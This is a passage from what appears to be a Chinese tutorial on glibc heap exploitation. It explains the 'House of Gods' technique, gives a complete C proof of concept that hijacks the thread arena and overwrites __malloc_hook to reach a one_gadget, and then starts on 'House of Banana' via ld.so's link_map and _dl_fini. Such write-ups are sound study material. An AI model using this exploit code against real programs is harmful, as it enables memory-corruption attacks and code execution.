<code>_int_malloc</code> 尝试再次分配内存。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">arena_get(ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">victim = _int_malloc(ar_ptr, bytes);</span><br><span class="line"><span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">   before.  */</span></span><br><span class="line"><span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    LIBC_PROBE(memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">    ar_ptr = arena_get_retry(ar_ptr, bytes);</span><br><span class="line">    victim = _int_malloc(ar_ptr, bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 由于
<code>arena</code> 为 <code>main_arena</code> ，因此实际上调用的是
<code>arena_get2</code> 。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> mstate</span><br><span class="line"><span class="title function_">arena_get_retry</span><span class="params">(mstate ar_ptr, <span class="type">size_t</span> bytes)</span> &#123;</span><br><span class="line">    LIBC_PROBE(memory_arena_retry, <span class="number">2</span>, bytes, ar_ptr);</span><br><span class="line">    <span class="keyword">if</span> (ar_ptr != &amp;main_arena) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        (<span class="type">void</span>) mutex_unlock(&amp;ar_ptr-&gt;mutex);</span><br><span class="line">        ar_ptr = arena_get2(bytes, ar_ptr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ar_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 在 <code>arena_get2</code>
函数中，我们有两种方式获取 <code>arena</code> 。 - 如果
<code>n &lt;= narenas_limit - 1</code> 则调用
<code>_int_new_arena</code> 创建一个新的 <code>arena</code> 。 -
否则调用 <code>reused_arena</code> 从现有的 <code>arena</code>
中找一个可用的 <code>arena</code> 。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> mstate internal_function <span class="title function_">arena_get2</span><span class="params">(<span class="type">size_t</span> size, mstate avoid_arena)</span> &#123;</span><br><span class="line">    mstate a;</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> <span class="type">size_t</span> narenas_limit;</span><br><span class="line"></span><br><span class="line">    a = get_free_list(); <span class="comment">// 调试发现返回 NULL</span></span><br><span class="line">    <span class="keyword">if</span> (a == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">/* Nothing immediately available, so generate a new arena.  */</span></span><br><span class="line">        <span class="keyword">if</span> (narenas_limit == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (mp_.arena_max != <span class="number">0</span>)</span><br><span class="line">                narenas_limit = mp_.arena_max;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (narenas &gt; mp_.arena_test) &#123;</span><br><span class="line">                <span class="type">int</span> n = __get_nprocs();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (n &gt;= <span class="number">1</span>)</span><br><span class="line">                    narenas_limit = NARENAS_FROM_NCORES(n);</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="comment">/* We have no information about the system.  Assume two</span></span><br><span class="line"><span class="comment">                   cores.  */</span></span><br><span class="line">                    narenas_limit = NARENAS_FROM_NCORES(<span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    repeat:;</span><br><span class="line">        <span class="type">size_t</span> n = narenas;</span><br><span class="line">        <span class="comment">/* NB: the following depends on the fact that (size_t)0 - 1 is a</span></span><br><span class="line"><span class="comment">         very large number and that the underflow is OK.  If arena_max</span></span><br><span class="line"><span class="comment">         is set the value of arena_test is irrelevant.  If arena_test</span></span><br><span class="line"><span class="comment">         is set but narenas is not yet larger or equal to arena_test</span></span><br><span class="line"><span class="comment">         narenas_limit is 0.  There is no possibility for narenas to</span></span><br><span class="line"><span class="comment">         be too big for the test to always fail since there is not</span></span><br><span class="line"><span class="comment">         enough address space to create that many arenas.  */</span></span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(n &lt;= narenas_limit - <span class="number">1</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (catomic_compare_and_exchange_bool_acq(&amp;narenas, n + <span class="number">1</span>, n))</span><br><span class="line">                <span class="keyword">goto</span> repeat;</span><br><span class="line">            a = _int_new_arena(size);</span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely(a == <span class="literal">NULL</span>))</span><br><span class="line">                catomic_decrement(&amp;narenas);</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">            a = reused_arena(avoid_arena);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<code>reused_arena</code> 从 <code>next_to_use</code> 开始沿
<code>arena.next</code> 链表找第一个满足
<code>!arena_is_corrupt(result) &amp;&amp; !mutex_trylock(&amp;result-&gt;mutex)</code>
的 <code>arena</code> ，<strong>并且会将找到的 <code>arena</code> 赋值给
<code>thread_arena</code> ，然后更新 <code>next_to_use</code> 为下一个
<code>arena</code></strong> 。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> mstate</span><br><span class="line"><span class="title function_">reused_arena</span><span class="params">(mstate avoid_arena)</span> &#123;</span><br><span class="line">    mstate result;</span><br><span class="line">    <span class="comment">/* <span class="doctag">FIXME:</span> Access to next_to_use suffers from data races.  */</span></span><br><span class="line">    <span class="type">static</span> mstate next_to_use;</span><br><span class="line">    <span class="keyword">if</span> (next_to_use == <span class="literal">NULL</span>)</span><br><span class="line">        next_to_use = &amp;main_arena;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Iterate over all arenas (including those linked from</span></span><br><span class="line"><span class="comment">     free_list).  */</span></span><br><span class="line">    result = next_to_use;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!arena_is_corrupt(result) &amp;&amp; !mutex_trylock(&amp;result-&gt;mutex))</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* <span class="doctag">FIXME:</span> This is a data race, see _int_new_arena.  */</span></span><br><span class="line">        result = result-&gt;next;</span><br><span class="line">    &#125; <span class="keyword">while</span> (result != next_to_use);</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">out:</span><br><span class="line">    ...</span><br><span class="line">    thread_arena = result;</span><br><span class="line">    next_to_use = result-&gt;next;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 因此我们可以修改
<code>main_arena.next</code> 指向伪造的 <code>arena</code>
然后<strong>两次</strong>调用
<code>malloc(0xffffffffffffffbf + 1);</code> 通过
<code>checked_request2size(bytes, nb);</code> 宏使得
<code>_int_malloc</code> 返回 NULL，最终使得 <code>thread_arena</code>
指向我们伪造的 <code>arena</code> 。具体过程如下：</p>
<p>首先需要确保 <code>narenas &gt; narenas_limit - 1</code> 从而调用
<code>reused_arena</code> ，因此要构造 unsorted bin attack 将
<code>narenas</code> 改成一个较大的数。 - 为了确保从 unsorted bin
中取出的 chunk 能通过
<code>victim-&gt;size &gt; av-&gt;system_mem</code> 检查，我们将
<code>main_arena.system_mem</code> 赋值为 0xffffffffffffffff 。 - 将
<code>INTM.bk</code> 指向 <code>&amp;narenas - 0x10</code> 构造 unsorted
bin attack 。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/5d5ab77efb8ef664ee277095ad929a90.png"
                     
alt="在这里插入图片描述" 
                > 将 <code>INTM</code> 申请出来，此时
<code>arenas</code> 上被写入了 <code>&amp;main_arena.top</code> 。</p>
<p>将 <code>main_arena.next</code> 指向 <code>INTM</code> ，连续两次
<code>malloc(0xffffffffffffffbf + 1);</code> 将<code>thread_arena</code>
指向我们伪造的 <code>INTM</code> ： - 第一次
<code>malloc(0xffffffffffffffbf + 1);</code> 使得
<code>thread_arena</code> 指向 <code>main_arena</code>
，<code>next_to_use</code> 指向 <code>INTM</code> 。 - 第一次
<code>malloc(0xffffffffffffffbf + 1);</code> 使得
<code>thread_arena</code> 指向 <code>INTM</code> 。</p>
<p>之后将 <code>*(uint64_t*) (INTM+0x30)</code> 指向伪造的 chunk
，此时如果 <code>malloc(0x68)</code> 就会将目标地址处的内存申请出来。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/d9e59dc2cab49ed4aa3347a08d1e2678.png"
                     
alt="在这里插入图片描述" 
                > <a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_gods" >poc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">void</span> *SMALLCHUNK = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">    <span class="type">void</span> *FAST20 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    <span class="type">void</span> *FAST40 = <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] leak libc base.&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(SMALLCHUNK);</span><br><span class="line">    <span class="type">uint64_t</span> leak = *((<span class="type">uint64_t</span> *) SMALLCHUNK);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] set binmap.&quot;</span>);</span><br><span class="line">    <span class="type">void</span> *INTM = <span class="built_in">malloc</span>(<span class="number">0x98</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] hijack main_arena.&quot;</span>);</span><br><span class="line">    SMALLCHUNK = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">    <span class="built_in">free</span>(SMALLCHUNK);</span><br><span class="line">    *((<span class="type">uint64_t</span> *) (SMALLCHUNK + <span class="number">0x8</span>)) = leak + <span class="number">0x7f8</span>;</span><br><span class="line">    *((<span class="type">uint64_t</span> *) (FAST40 + <span class="number">0x8</span>)) = (<span class="type">uint64_t</span>) (INTM - <span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">free</span>(FAST20);</span><br><span class="line">    <span class="built_in">free</span>(FAST40);</span><br><span class="line">    <span class="type">void</span> *BINMAP = <span class="built_in">malloc</span>(<span class="number">0x1f8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] switch to fake arena.&quot;</span>);</span><br><span class="line">    *((<span class="type">uint64_t</span> *) (INTM + <span class="number">0x8</span>)) = leak - <span class="number">0xa40</span>;</span><br><span class="line">    *((<span class="type">uint64_t</span> *) (BINMAP + <span class="number">0x20</span>)) = <span class="number">0xffffffffffffffff</span>;</span><br><span class="line">    INTM = <span class="built_in">malloc</span>(<span class="number">0x98</span>);</span><br><span class="line">    *((<span class="type">uint64_t</span> *) (BINMAP + <span class="number">0x8</span>)) = (<span class="type">uint64_t</span>) (INTM - <span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xffffffffffffffbf</span> + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xffffffffffffffbf</span> + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] arbitrary address alloc.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    *((<span class="type">uint64_t</span> *) (INTM + <span class="number">0x20</span>)) = leak - <span class="number">0x8b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] hijack __malloc_hook.&quot;</span>);</span><br><span class="line">    <span class="type">void</span> *FAKECHUNK = <span class="built_in">malloc</span>(<span class="number">0x68</span>);</span><br><span class="line">    *(<span class="type">uint64_t</span> *) (FAKECHUNK + <span class="number">0x13</span>) = leak - <span class="number">0x2c5f71</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger one_gadget.&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x114514</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h1 id="house-of-banana">House of Banana</h1>
<p>在 ld.so 中定义了一个类型为 rtld_global 的全局变量 _rtld_global 。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* This is the structure which defines all variables global to ld.so</span></span><br><span class="line"><span class="comment">   (except those which cannot be added for some reason).  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtld_global</span> _<span class="title">rtld_global</span> =</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* Get architecture specific initializer.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dl-procruntime.c&gt;</span></span></span><br><span class="line">    <span class="comment">/* Generally the default presumption without further information is an</span></span><br><span class="line"><span class="comment">     * executable stack but this is not true for all platforms.  */</span></span><br><span class="line">    ._dl_stack_flags = DEFAULT_STACK_PERMS,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC_REENTRANT</span></span><br><span class="line">    ._dl_load_lock = _RTLD_LOCK_RECURSIVE_INITIALIZER,</span><br><span class="line">    ._dl_load_write_lock = _RTLD_LOCK_RECURSIVE_INITIALIZER,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    ._dl_nns = <span class="number">1</span>,</span><br><span class="line">    ._dl_ns =</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC_REENTRANT</span></span><br><span class="line">      [LM_ID_BASE] = &#123; ._ns_unique_sym_table</span><br><span class="line">		       = &#123; .lock = _RTLD_LOCK_RECURSIVE_INITIALIZER &#125; &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure></div> 其中 rtld_global 类型部分定义如下： <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtld_global</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="comment">/* Don&#x27;t change the order of the following elements.  &#x27;dl_loaded&#x27;</span></span><br><span class="line"><span class="comment">     must remain the first element.  Forever.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Non-shared code has no support for multiple namespaces.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> DL_NNS 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> DL_NNS 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  EXTERN <span class="class"><span class="keyword">struct</span> <span class="title">link_namespaces</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* A pointer to the map for the main map.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *_<span class="title">ns_loaded</span>;</span></span><br><span class="line">    <span class="comment">/* Number of object in the _dl_loaded list.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> _ns_nloaded;</span><br><span class="line">    <span class="comment">/* Direct pointer to the searchlist of the main object.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> *_<span class="title">ns_main_searchlist</span>;</span></span><br><span class="line">    <span class="comment">/* This is zero at program start to signal that the global scope map is</span></span><br><span class="line"><span class="comment">       allocated by rtld.  Later it keeps the size of the map.  It might be</span></span><br><span class="line"><span class="comment">       reset if in _dl_close if the last global object is removed.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> _ns_global_scope_alloc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* During dlopen, this is the number of objects that still need to</span></span><br><span class="line"><span class="comment">       be added to the global scope map.  It has to be taken into</span></span><br><span class="line"><span class="comment">       account when resizing the map, for future map additions after</span></span><br><span class="line"><span class="comment">       recursive dlopen calls from ELF constructors.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> _ns_global_scope_pending_adds;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Once libc.so has been loaded into the namespace, this points to</span></span><br><span class="line"><span class="comment">       its link map.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">libc_map</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Search table for unique objects.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">unique_sym_table</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      __rtld_lock_define_recursive (, lock)</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">unique_sym</span></span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line">	<span class="type">uint32_t</span> hashval;</span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">	<span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">map</span>;</span></span><br><span class="line">      &#125; *entries;</span><br><span class="line">      <span class="type">size_t</span> size;</span><br><span class="line">      <span class="type">size_t</span> n_elements;</span><br><span class="line">      <span class="type">void</span> (*<span class="built_in">free</span>) (<span class="type">void</span> *);</span><br><span class="line">    &#125; _ns_unique_sym_table;</span><br><span class="line">    <span class="comment">/* Keep track of changes to each namespace&#x27; list.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_debug</span> _<span class="title">ns_debug</span>;</span></span><br><span class="line">  &#125; _dl_ns[DL_NNS];</span><br><span class="line">  <span class="comment">/* One higher than index of last used namespace.  */</span></span><br><span class="line">  EXTERN <span class="type">size_t</span> _dl_nns;</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure></div>
这里只需要关注 link_namespaces 类型的数组 _dl_ns[DL_NNS]
和该数组中有效元素的数量 _dl_nns 以及 link_map 类型的指针 _ns_loaded
和该指针指向的链表元素数量 _ns_nloaded 。</p>
<p>link_map 相关结构如下： 其中主要关注的是
l_addr，l_next，l_real，l_info[DT_FINI_ARRAY]（l_info[26]），l_info[DT_FINI_ARRAYSZ]（l_info[28]），l_init_called。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* These first few members are part of the protocol with the debugger.</span></span><br><span class="line"><span class="comment">       This is the same format used in SVR4.  */</span></span><br><span class="line"></span><br><span class="line">    ElfW(Addr) l_addr;		<span class="comment">/* Difference between the address in the ELF</span></span><br><span class="line"><span class="comment">				   file and the addresses in memory.  */</span></span><br><span class="line">    <span class="type">char</span> *l_name;		<span class="comment">/* Absolute file name object was found in.  */</span></span><br><span class="line">    ElfW(Dyn) *l_ld;		<span class="comment">/* Dynamic section of the shared object.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">/* Chain of loaded objects.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* All following members are internal to the dynamic linker.</span></span><br><span class="line"><span class="comment">       They may change without notice.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This is an element which is only ever different from a pointer to</span></span><br><span class="line"><span class="comment">       the very same copy of this type for ld.so when it is used in more</span></span><br><span class="line"><span class="comment">       than one namespace.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_real</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Number of the namespace this link map belongs to.  */</span></span><br><span class="line">    Lmid_t l_ns;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">libname_list</span> *<span class="title">l_libname</span>;</span></span><br><span class="line">    <span class="comment">/* Indexed pointers to dynamic section.</span></span><br><span class="line"><span class="comment">       [0,DT_NUM) are indexed by the processor-independent tags.</span></span><br><span class="line"><span class="comment">       [DT_NUM,DT_NUM+DT_THISPROCNUM) are indexed by the tag minus DT_LOPROC.</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM,DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM) are</span></span><br><span class="line"><span class="comment">       indexed by DT_VERSIONTAGIDX(tagvalue).</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM,</span></span><br><span class="line"><span class="comment">	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM) are indexed by</span></span><br><span class="line"><span class="comment">       DT_EXTRATAGIDX(tagvalue).</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM,</span></span><br><span class="line"><span class="comment">	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM) are</span></span><br><span class="line"><span class="comment">       indexed by DT_VALTAGIDX(tagvalue) and</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM,</span></span><br><span class="line"><span class="comment">	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM+DT_ADDRNUM)</span></span><br><span class="line"><span class="comment">       are indexed by DT_ADDRTAGIDX(tagvalue), see &lt;elf.h&gt;.  */</span></span><br><span class="line"></span><br><span class="line">    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM</span><br><span class="line">		      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];</span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Phdr)</span> *l_phdr;	<span class="comment">/* Pointer to program header table in core.  */</span></span><br><span class="line">    ElfW(Addr) l_entry;		<span class="comment">/* Entry point location.  */</span></span><br><span class="line">    ElfW(Half) l_phnum;		<span class="comment">/* Number of program header entries.  */</span></span><br><span class="line">    ElfW(Half) l_ldnum;		<span class="comment">/* Number of dynamic segment entries.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Array of DT_NEEDED dependencies and their dependencies, in</span></span><br><span class="line"><span class="comment">       dependency order for symbol lookup (with and without</span></span><br><span class="line"><span class="comment">       duplicates).  There is no entry before the dependencies have</span></span><br><span class="line"><span class="comment">       been loaded.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> <span class="title">l_searchlist</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* We need a special searchlist to process objects marked with</span></span><br><span class="line"><span class="comment">       DT_SYMBOLIC.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> <span class="title">l_symbolic_searchlist</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Dependent object that first caused this object to be loaded.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_loader</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Array with version names.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">l_versions</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_nversions;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Symbol hash table.  */</span></span><br><span class="line">    Elf_Symndx l_nbuckets;</span><br><span class="line">    Elf32_Word l_gnu_bitmask_idxbits;</span><br><span class="line">    Elf32_Word l_gnu_shift;</span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Addr)</span> *l_gnu_bitmask;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="type">const</span> Elf32_Word *l_gnu_buckets;</span><br><span class="line">      <span class="type">const</span> Elf_Symndx *l_chain;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="type">const</span> Elf32_Word *l_gnu_chain_zero;</span><br><span class="line">      <span class="type">const</span> Elf_Symndx *l_buckets;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_direct_opencount; <span class="comment">/* Reference count for dlopen/dlclose.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span>			/* <span class="title">Where</span> <span class="title">this</span> <span class="title">object</span> <span class="title">came</span> <span class="title">from</span>.  */</span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line">	lt_executable,		<span class="comment">/* The main executable program.  */</span></span><br><span class="line">	lt_library,		<span class="comment">/* Library needed by main executable.  */</span></span><br><span class="line">	lt_loaded		<span class="comment">/* Extra run-time loaded shared object.  */</span></span><br><span class="line">      &#125; l_type:<span class="number">2</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_relocated:<span class="number">1</span>;	<span class="comment">/* Nonzero if object&#x27;s relocations done.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_init_called:<span class="number">1</span>; <span class="comment">/* Nonzero if DT_INIT function called.  */</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure></div></p>
<p>在 _dl_fini 函数中有对 _dl_ns 数组以及 _dl_ns 中的链表 _ns_loaded
的遍历，主要逻辑如下： <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">for</span> (Lmid_t ns = GL(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Protect against concurrent loads and unloads.  */</span></span><br><span class="line">      __rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line"></span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> nloaded = GL(dl_ns)[ns]._ns_nloaded;</span><br><span class="line">      <span class="comment">/* No need to do anything for empty namespaces or those used for</span></span><br><span class="line"><span class="comment">	 auditing DSOs.  */</span></span><br><span class="line">      <span class="keyword">if</span> (nloaded == <span class="number">0</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">	  || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	  )</span><br><span class="line">	__rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">/* Now we can allocate an array to hold all the pointers and</span></span><br><span class="line"><span class="comment">	     copy the pointers in.  */</span></span><br><span class="line">	  <span class="keyword">struct</span> link_map *maps[nloaded];</span><br><span class="line"></span><br><span class="line">	  <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">	  <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">	  assert (nloaded != <span class="number">0</span> || GL(dl_ns)[ns]._ns_loaded == <span class="literal">NULL</span>);</span><br><span class="line">	  <span class="keyword">for</span> (l = GL(dl_ns)[ns]._ns_loaded, i = <span class="number">0</span>; l != <span class="literal">NULL</span>; l = l-&gt;l_next)</span><br><span class="line">	    <span class="comment">/* Do not handle ld.so in secondary namespaces.  */</span></span><br><span class="line">	    <span class="keyword">if</span> (l == l-&gt;l_real)</span><br><span class="line">	      &#123;</span><br><span class="line">		assert (i &lt; nloaded);</span><br><span class="line"></span><br><span class="line">		maps[i] = l;</span><br><span class="line">		l-&gt;l_idx = i;</span><br><span class="line">		++i;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Bump l_direct_opencount of all objects so that they</span></span><br><span class="line"><span class="comment">		   are not dlclose()ed from underneath us.  */</span></span><br><span class="line">		++l-&gt;l_direct_opencount;</span><br><span class="line">	      &#125;</span><br><span class="line">	  assert (ns != LM_ID_BASE || i == nloaded);</span><br><span class="line">	  assert (ns == 